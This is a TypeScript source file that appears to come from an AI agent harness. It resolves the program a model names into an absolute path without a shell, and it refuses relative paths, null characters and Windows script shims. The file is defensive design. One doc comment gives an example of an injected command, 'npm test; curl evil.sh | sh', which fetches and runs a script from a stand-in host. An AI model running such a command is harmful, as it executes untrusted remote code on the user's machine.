import { statSync } from "node:fs";
import { basename, delimiter, extname, isAbsolute, join } from "node:path";

import { ToolError } from "../errors.js";

/**
 * Turning the program the model named into an absolute path.
 *
 * This is the one place in the harness where **the model chooses the
 * executable**. ADR 0013 called that out as the property that separates
 * substrate from arbitrary execution, and `shell` is the tool that gives it up
 * — deliberately, which is why it declares `execute` while `git` does not.
 *
 * The other two properties still hold and are what keep this bounded: we build
 * the argument vector, and there is no interpreter between us and the program.
 * `npm test; curl evil.sh | sh` is a program named `npm test; curl evil.sh | sh`
 * that does not exist, not four commands.
 */

/** Only what `runProcess` will spawn without a shell. */
const RUNNABLE_EXTENSIONS = process.platform === "win32" ? [".exe", ".com"] : [""];

/**
 * Extensions Windows treats as programs but which are really scripts for
 * `cmd.exe`.
 *
 * Named separately from "not found" because the fix is completely different,
 * and because this is the single most common thing a user will hit: `npm`,
 * `pnpm`, `yarn`, `tsc`, and most tools installed through npm are `.cmd` shims
 * on Windows.
 */
const SHIM_EXTENSIONS = [".cmd", ".bat", ".ps1"];

export interface ResolvedProgram {
  readonly path: string;
  /** The bare name, which is what a permission rule matches on. */
  readonly name: string;
}

function isFile(path: string): boolean {
  try {
    return statSync(path).isFile();
  } catch {
    return false;
  }
}

/** `shell:node`. Matches the `git:push` shape so one rule syntax covers both. */
export function shellResource(name: string): string {
  return `shell:${name.toLowerCase()}`;
}

function shimRefusal(program: string, found: string): ToolError {
  return new ToolError("invalid_input", {
    message:
      `${program} is a script that needs a command shell to run, and Project Studio does not use one. ` +
      `Run the underlying program directly instead — for an npm-installed tool that usually means ` +
      `node with the tool's own .js entry point. (Found ${basename(found)}.)`,
  });
}

/**
 * Finds a program, or refuses with something the user can act on.
 *
 * Reading `PATH` here is *locating* a program, which is a different act from
 * handing `PATH` to a child. `runProcess` still refuses to pass it on, so a
 * program we start cannot use it to find tools nobody approved. The vendor
 * resolver makes the same distinction for the same reason.
 */
export function resolveProgram(
  program: string,
  options: { readonly searchPath?: string } = {},
): ResolvedProgram {
  if (program.trim() === "") {
    throw new ToolError("invalid_input", { message: "A command is required." });
  }

  if (program.includes("\0")) {
    throw new ToolError("invalid_input", {
      message: "A command may not contain a null character.",
    });
  }

  const name = basename(program).replace(/\.(exe|com|cmd|bat|ps1)$/i, "");

  if (isAbsolute(program)) {
    if (SHIM_EXTENSIONS.includes(extname(program).toLowerCase())) {
      throw shimRefusal(program, program);
    }
    if (!isFile(program)) {
      throw new ToolError("invalid_input", {
        message: `There is no program at ${program}.`,
      });
    }
    return { path: program, name };
  }

  // A relative path is refused rather than resolved against the working
  // directory. `./build.sh` would mean "run whatever this repository ships",
  // which is the one thing an untrusted checkout must not be able to arrange
  // by being opened.
  if (program.includes("/") || program.includes("\\")) {
    throw new ToolError("invalid_input", {
      message:
        "Name a program, or give its full path. A path relative to the project is not accepted.",
    });
  }

  const searchPath = options.searchPath ?? process.env.PATH ?? "";
  let shim: string | undefined;

  for (const entry of searchPath.split(delimiter)) {
    const directory = entry.trim().replace(/^"|"$/g, "");
    if (directory === "" || !isAbsolute(directory)) continue;

    for (const extension of RUNNABLE_EXTENSIONS) {
      const candidate = join(directory, `${program}${extension}`);
      if (isFile(candidate)) return { path: candidate, name };
    }

    // Remembered but not returned. Finding only a shim is worth a different
    // message than finding nothing, and the search continues in case a real
    // executable sits later on the path.
    if (shim === undefined && process.platform === "win32") {
      shim = SHIM_EXTENSIONS.map((extension) =>
        join(directory, `${program}${extension}`),
      ).find(isFile);
    }
  }

  if (shim !== undefined) throw shimRefusal(program, shim);

  throw new ToolError("invalid_input", {
    message: `${program} is not installed, or is not on this machine's program path.`,
  });
}
